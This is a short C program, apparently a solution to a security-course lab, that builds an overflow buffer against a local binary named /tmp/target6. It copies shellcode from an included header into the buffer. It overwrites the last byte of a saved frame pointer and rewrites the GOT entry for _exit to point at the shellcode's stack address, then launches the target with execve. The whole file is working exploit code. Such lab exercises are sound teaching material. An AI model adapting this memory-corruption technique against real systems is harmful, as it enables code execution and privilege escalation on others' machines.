#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char *args[3];
  char *env[1];

  char exploit[201];
  memset(exploit, 0xff, 200);
  exploit[200] = 0x74; // change last byte of stored $ebp in bar
  memcpy(exploit, shellcode, sizeof(shellcode) - 1);
  int *p = (int *)(exploit + 188); // change got entry for _exit
  *p = 0x0804a00c;
  int *a = (int *)(exploit + 184); // set got entry to where shellcode stored
  *a = 0xbffffcb4;

  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
